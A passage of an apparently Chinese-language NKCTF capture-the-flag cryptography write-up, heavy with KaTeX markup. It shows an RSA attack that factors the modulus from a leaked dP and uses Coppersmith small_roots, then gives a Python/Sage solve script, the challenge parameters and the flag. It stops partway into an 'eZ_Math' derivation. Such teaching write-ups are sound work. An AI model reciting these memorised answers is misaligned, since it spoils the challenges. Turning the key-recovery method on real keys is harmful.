class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>根据同余以及费马小定理<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a^{p-1}=1\mod{p})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>，有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c_1=m\mod{p},c_2=m\mod{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p>构造多项式：有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo>+</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mi>m</mi><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>c</mi><mn>2</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(m)=m^2-(c_1+c_2)*m+c_1*c_2\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6153em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>第三步：coppersmith攻击可以帮助求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>y</mi><mn>0</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">f(x_0)=y_0\mod{N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>,其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo>&lt;</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">x_0&lt;X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>是一个上界。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">n =  <span class="hljs-number">114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641</span><br>N =  <span class="hljs-number">1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028</span><br>dP =  <span class="hljs-number">33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#已知e,dp,n分解n</span><br><span class="hljs-comment">#dp =d mod p-1</span><br><span class="hljs-comment">#e*dp =1 +k*(p-1)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> (e*dP-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:<br>        P=<span class="hljs-number">1</span>+ (e*dP-<span class="hljs-number">1</span>)//i<br>        <span class="hljs-keyword">if</span> N%P==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(P)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">P=37269067352457630263351774206178494913957088859822110344334922741582406663357663275001777826744534556652993452577088773275825539553907027527722045884489297259984687894496505265384077983882580247333972954704644517469999916574893996324149548980338301147983367163067556434434982470623587914250041142380667816331</span><br><span class="hljs-string">assert N%P==0</span><br><span class="hljs-string">Q=N//P</span><br><span class="hljs-string">R.&lt;x&gt;=Zmod(n)[]</span><br><span class="hljs-string">f=x^2-(P+Q)*x+P*Q</span><br><span class="hljs-string">flag=f.small_roots(X=2^300)</span><br><span class="hljs-string">print(flag)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#NKCTF&#123;Th1S_a_babyRSA_y0u_are_tql!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="eZ-Math">eZ_Math</h2><p>考点：</p><ol><li>数论推导，欧拉定理，rsa参数之间的关系等</li></ol><p>题目给了很多<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>x</mi><mi>i</mi></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">{a_i}^{x_i}\mod{n}={c_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8144em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>注意到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>都很小，而且有的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是幂指关系：如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>=</mo><msup><mn>2</mn><mn>2</mn></msup><mo separator="true">,</mo><mn>8</mn><mo>=</mo><msup><mn>2</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">4=2^2,8=2^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>,在不同的底数下，也存在相同的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>我们可以找到其中一组幂指关系的：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><msup><msub><mi>a</mi><mn>1</mn></msub><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">a_1,a_2={a_1}^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9991em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span>，并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>相同的。</p><p>那么此时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>a</mi><mn>1</mn><msub><mi>x</mi><mn>1</mn></msub></msubsup><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a_1^{x_1}=c_1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span 